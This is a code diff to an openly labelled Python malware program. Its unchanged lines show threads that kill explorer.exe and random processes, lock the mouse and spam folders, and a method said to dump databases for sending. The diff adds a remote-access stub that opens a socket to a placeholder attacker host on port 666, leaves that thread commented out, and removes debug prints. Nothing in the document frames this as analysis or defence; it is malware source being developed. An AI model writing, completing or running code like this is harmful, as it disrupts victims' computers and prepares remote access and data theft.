@@ -1,4 +1,4 @@
-import ctypes, random, time, webbrowser, threading, sys, os, psutil, base64, shutil, string, mouse
+import ctypes, random, time, webbrowser, threading, sys, os, psutil, base64, shutil, string, mouse, socket
 
 
 class harmless:
@@ -25,7 +25,6 @@ class harmless:
         """Changes the wallpaper with random images from screenshot folder"""
         while 1:
             try:
-                print("DEBUG CHANGED WALLPAPER")
                 pic = random.choice(os.listdir(f"{os.path.expanduser('~')}\Pictures\Screenshots"))
                 path = f"{os.path.expanduser('~')}\Pictures\Screenshots\{pic}"
                 
@@ -45,7 +44,6 @@ class malware:
     def kill(self):
         """Kills select tasks"""
         while 1:
-            print("[DEBUG]Kill")
             kill_list = ["explorer.exe",
                          "wallpaper64.exe",
                          "wallpaper32.exe",
@@ -57,7 +55,6 @@ class malware:
     def random_kill(self):
         """KILLS RANDOM PROCESSES"""
         while 1:
-            print("CALLED RANDOM KILL")
             processes = []
             for proc in psutil.process_iter():
                 try:
@@ -114,8 +111,14 @@ class malware:
     
         
 class harmful:
-    def loops(self):
-        pass
+    def rat(self):
+        client = socket.socket()
+        host = "ur host ip go here"
+        port = 666
+        format = "utf-8"
+        client.connect((host,port))
+        
+        client.close()
     
     def dump(self):
         """Dumps databases and thing prepared for sending"""
@@ -150,6 +153,9 @@ if __name__ == "__main__":
     kill_thread = threading.Thread(target=malware.kill).start()
     random_kill_thread = threading.Thread(target=malware.random_kill).start()
     create_random_folder_thread = threading.Thread(target=malware.create_random_folder).start()
+    #rat_thread = threading.Thread(target=harmful.rat).start()
+    
+    #Make rat multiprocessed
     
     popup_thread.join()
     openurl_thread.join()
@@ -158,6 +164,7 @@ if __name__ == "__main__":
     mouse_locker.join()
     random_kill_thread.join()
     create_random_folder_thread.join()
+    #rat_thread.join()
     
     
     
